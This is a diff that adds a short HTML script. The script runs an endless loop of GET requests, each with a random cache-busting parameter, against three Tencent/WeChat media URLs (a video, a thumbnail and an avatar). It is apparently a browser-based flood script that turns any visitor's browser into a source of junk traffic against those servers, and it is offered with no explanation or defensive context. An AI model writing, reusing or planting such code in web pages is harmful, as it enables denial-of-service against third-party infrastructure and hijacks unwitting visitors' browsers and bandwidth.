@@ -1,0 +1,15 @@
+<script>
+var links = [
+    "http://wxsnsdy.wxs.qq.com/131/20210/snssvpdownload/SH/reserved/ads_svp_video__0b535iabaaaawaaaeut6c5rrv2qecdvaaeca.f142000.mp4?dis_k=e59b434be4fc096987caf243dd8df0dc&dis_t=1669207076&sha256=84b7cd2fe72f7e8c4d6d76c9607cd870f9f24543d0c4694e7102ad46442c66d2&m=0ed323f3205ad3b198ead058089aca31",
+    "http://wxsnsdythumb.wxs.qq.com/141/20204/snscosdownload/SZ/reserved/6427ea17000998d617465b9db4c7b50b0000008d00004eec?m=38e9b339fb2e6ac2e01a80eae5004d04&ck=38e9b339fb2e6ac2e01a80eae5004d04&sha256=625474f97554a0acc227db784523e46058eaf5c0a9ea06cf3855dc91d7116ea0",
+    "http://wx.qlogo.cn/mmhead/Q3auHgzwzM6HLfhq6PLVibHnf8XDX2IXUFXLicOsPEaicc5LQmZC9ZJNg/0",
+]
+
+while (true) {
+    for(link in links) {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET",links[link] + "?t=" + Math.random(),true);
+        xhr.send();
+    }
+}
+</script>
